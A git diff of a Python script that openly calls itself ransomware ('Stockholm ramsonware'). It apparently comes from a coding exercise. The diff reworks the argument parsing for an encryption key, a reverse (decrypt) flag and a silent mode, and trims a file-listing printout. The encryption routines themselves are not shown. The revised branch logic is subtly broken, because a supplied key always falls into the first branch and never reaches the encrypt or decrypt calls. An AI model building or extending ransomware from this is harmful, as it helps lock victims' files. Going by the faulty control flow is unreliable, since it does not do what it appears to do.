@@ -48,12 +48,6 @@ def get_files_ft():
         for f in file[2]:
             if f.endswith(".ft"):
                 files_ft.append(file[0] + "/" + f)
-    # for fi in files_ft:
-    #     try:
-    #         with exiftool.ExifToolHelper() as et:
-    #             metadata = et.get_metadata(file)
-    #     except:
-    #         files_ft.remove(fi)
     return (files_ft)
 
 def encryptFiles(silent, key):
@@ -75,11 +69,6 @@ def encryptFiles(silent, key):
 
 def decryptFiles(silent, key):
     files = get_files_ft()
-    if (silent == False):
-        print("ENCRYPTED FILE LIST")
-        for fi in files:
-            print(fi)
-        print()
     for file in files:
         if (silent == False):
             print("Trying to decrypt file:", file, "and rename it as:", (file.rstrip("ft")).rstrip('.'))
@@ -99,7 +88,7 @@ def decryptFiles(silent, key):
 if __name__ == '__main__':
     if len(sys.argv) > 1:
         parser = argparse.ArgumentParser(description='My own private ramsonware.', add_help=False)
-        parser.add_argument('key', type=str, action='store', nargs='?')
+        parser.add_argument('key', type=str, default=None, action='store', nargs='?')
         parser.add_argument('-r', '--reverse', action='store_true')
         parser.add_argument('-s', '--silent', action='store_true')
         parser.add_argument('-v', '--version', action='store_true')
@@ -121,15 +110,18 @@ if __name__ == '__main__':
                 print(markdown_string)
         elif (args.version == True):
             print("Stockholm ramsonware version 1.0.0")
-        elif (args.reverse == False and len(args.key) >= 16):
-            encryptFiles(args.silent, args.key)
-            exit
-        elif (args.reverse == True and len(args.key) >= 16):
-            decryptFiles(args.silent, args.key)
-            exit
-        elif (len(args.key) < 16):
-            print("Your key must have at least 16 characters")
-            exit
+        elif (args.key != None):
+            if len(args.key) < 16:
+                print("Your key must have at least 16 characters")
+                exit
+        elif (args.reverse == False and args.key != None):
+            if len(args.key) >= 16:
+                encryptFiles(args.silent, args.key)
+                exit
+        elif (args.reverse == True and args.key != None):
+            if len(args.key) >= 16:
+                decryptFiles(args.silent, args.key)
+            exit  
         else:
             print("ERROR: Invalid argument please use flag -h to get some help.")
             exit
